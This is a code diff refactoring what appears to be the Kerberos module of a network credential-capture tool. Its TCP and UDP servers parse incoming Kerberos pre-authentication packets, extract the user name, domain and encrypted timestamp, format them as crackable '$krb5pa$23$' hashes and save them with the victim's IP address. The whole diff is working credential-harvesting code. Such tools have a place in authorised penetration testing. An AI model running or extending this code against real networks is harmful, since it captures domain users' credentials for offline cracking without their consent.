@@ -14,10 +14,6 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import os
-import struct
-import settings
-
 from SocketServer import BaseRequestHandler
 from utils import *
 
@@ -50,8 +46,7 @@ def ParseMSKerbv5TCP(Data):
 				Domain     = Data[148+NameLen+4:148+NameLen+4+DomainLen]
 				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 				return BuildHash
-
-			if HashLen == 54:
+			elif HashLen == 54:
 				Hash       = Data[53:105]
 				SwitchHash = Hash[16:]+Hash[0:16]
 				NameLen    = struct.unpack('<b',Data[148:149])[0]
@@ -60,7 +55,6 @@ def ParseMSKerbv5TCP(Data):
 				Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
 				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 				return BuildHash
-
 		else:
 			Hash       = Data[48:100]
 			SwitchHash = Hash[16:]+Hash[0:16]
@@ -70,8 +64,7 @@ def ParseMSKerbv5TCP(Data):
 			Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
 			BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 			return BuildHash
-	else:
-		return False
+	return False
 
 def ParseMSKerbv5UDP(Data):
 	MsgType = Data[17:18]
@@ -80,7 +73,6 @@ def ParseMSKerbv5UDP(Data):
 	if MsgType == "\x0a" and EncType == "\x17":
 		if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
 			HashLen = struct.unpack('<b',Data[41:42])[0]
-
 			if HashLen == 54:
 				Hash       = Data[44:96]
 				SwitchHash = Hash[16:]+Hash[0:16]
@@ -90,8 +82,7 @@ def ParseMSKerbv5UDP(Data):
 				Domain     = Data[145+NameLen+4:145+NameLen+4+DomainLen]
 				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 				return BuildHash
-
-			if HashLen == 53:
+			elif HashLen == 53:
 				Hash       = Data[44:95]
 				SwitchHash = Hash[16:]+Hash[0:16]
 				NameLen    = struct.unpack('<b',Data[143:144])[0]
@@ -100,8 +91,6 @@ def ParseMSKerbv5UDP(Data):
 				Domain     = Data[144+NameLen+4:144+NameLen+4+DomainLen]
 				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 				return BuildHash
-
-
 		else:
 			Hash       = Data[49:101]
 			SwitchHash = Hash[16:]+Hash[0:16]
@@ -111,49 +100,39 @@ def ParseMSKerbv5UDP(Data):
 			Domain     = Data[150+NameLen+4:150+NameLen+4+DomainLen]
 			BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
 			return BuildHash
-	else:
-		return False
+	return False
 
 class KerbTCP(BaseRequestHandler):
-
 	def handle(self):
-		try:
-			data = self.request.recv(1024)
-			KerbHash = ParseMSKerbv5TCP(data)
+		data = self.request.recv(1024)
+		KerbHash = ParseMSKerbv5TCP(data)
 
-			if KerbHash:
-				(n, krb, v, name, domain, d, h) = KerbHash.split('$')
+		if KerbHash:
+			n, krb, v, name, domain, d, h = KerbHash.split('$')
 
-				SaveToDb({
-					'module': 'KERB',
-					'type': 'MSKerbv5',
-					'client': self.client_address[0],
-					'user': domain+'\\'+name,
-					'hash': h,
-					'fullhash': KerbHash,
-				})
-
-		except Exception:
-			raise
+			SaveToDb({
+				'module': 'KERB',
+				'type': 'MSKerbv5',
+				'client': self.client_address[0],
+				'user': domain+'\\'+name,
+				'hash': h,
+				'fullhash': KerbHash,
+			})
 
 class KerbUDP(BaseRequestHandler):
 
 	def handle(self):
-		try:
-			data, soc = self.request
-			KerbHash = ParseMSKerbv5UDP(data)
-			
-			if KerbHash:
-				(n, krb, v, name, domain, d, h) = KerbHash.split('$')
+		data, soc = self.request
+		KerbHash = ParseMSKerbv5UDP(data)
 
-				SaveToDb({
-					'module': 'KERB',
-					'type': 'MSKerbv5',
-					'client': self.client_address[0],
-					'user': domain+'\\'+name,
-					'hash': h,
-					'fullhash': KerbHash,
-				})
+		if KerbHash:
+			(n, krb, v, name, domain, d, h) = KerbHash.split('$')
 
-		except Exception:
-			raise
+			SaveToDb({
+				'module': 'KERB',
+				'type': 'MSKerbv5',
+				'client': self.client_address[0],
+				'user': domain+'\\'+name,
+				'hash': h,
+				'fullhash': KerbHash,
+			})
